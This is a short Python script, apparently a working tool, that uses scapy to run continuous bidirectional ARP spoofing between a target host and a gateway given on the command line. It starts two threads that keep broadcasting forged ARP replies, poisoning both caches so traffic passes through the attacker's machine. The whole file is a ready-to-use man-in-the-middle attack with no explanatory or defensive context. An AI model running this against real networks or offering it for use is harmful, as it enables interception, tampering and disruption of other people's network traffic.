from scapy.all import *
import sys
import time
import threading

def ARPspoof(target, fakeip):
    while True:
        pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target, psrc=fakeip)
        sendp(pkt)
        time.sleep(0.6)


if __name__ == '__main__':
    target = str(sys.argv[1]).strip()
    gateway = str(sys.argv[2]).strip()
    t1 = threading.Thread(target=ARPspoof, args=(target, gateway))
    t2 = threading.Thread(target=ARPspoof, args=(gateway, target))
    t1.start()
    t2.start()
